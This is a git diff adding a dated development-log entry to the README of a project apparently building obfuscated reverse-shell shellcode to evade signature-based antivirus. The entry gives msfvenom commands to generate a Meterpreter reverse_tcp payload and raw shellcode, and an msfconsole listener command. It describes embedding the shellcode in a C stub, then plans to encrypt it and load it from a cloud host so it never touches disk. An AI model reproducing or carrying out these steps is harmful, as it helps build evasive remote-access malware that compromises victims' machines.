@@ -1,6 +1,30 @@
 # reverse-shell
 Obfuscated reverse-shell shellcode aimed to bypass signature-based antivirus algorithms.
 
+# 10/18/2024
+Russell:
+    uploaded main-stub.c
+    This "stub" successfully executes our malicous shellcode!!! Feelsgoodman.
+
+To create payload:
+
+        msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={IP} LPORT={PORT} -f exe -o file.exe
+        
+
+I converted a working reverse shell exe to a raw binary file:
+
+            msfvenom -p windows/exec CMD=file.exe -f raw -o file.raw
+
+To listen:
+
+        msfconsole -q -x "use multi/handler; set payload windows/x64/shell/reverse_tcp; set lhost {IP}; set lport {port}; exploit"
+
+Then, I put the binary file into a hex editor and then converted that hex machine code to a .c file
+to be stored as an unsigned character array containing our malicous hex machine code.
+Then, I put the hex machine code inside of main-stub.c
+compiled and then muah, perfection. Works great. So now what is next to do is to make a python script to encrypt the shellcode and then modify the main-stub.c to decrypt the shellcode and then execute. Oh, and of course the encrypted shellcode should be uploaded to a cloud so it never touches the user's disk.
+
+
 # 10/17/2024
 Russell:
 
